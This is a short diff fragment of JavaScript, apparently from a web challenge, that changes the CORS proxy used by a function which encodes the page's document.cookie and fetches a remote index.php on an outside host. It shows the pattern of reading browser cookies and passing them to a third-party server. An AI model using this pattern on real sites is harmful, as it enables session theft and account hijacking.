@@ -11,7 +11,7 @@
         async function setCookies() {
             try {
                 const encodedCookieValue = encodeURIComponent(document.cookie);
-                const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
+                const proxyUrl = 'https://echo.hoppscotch.io/';
                 const targetUrl = 'https://host3.metaproblems.com:6020/index.php';
                 
                 const setResponse = await fetch(proxyUrl + targetUrl, {
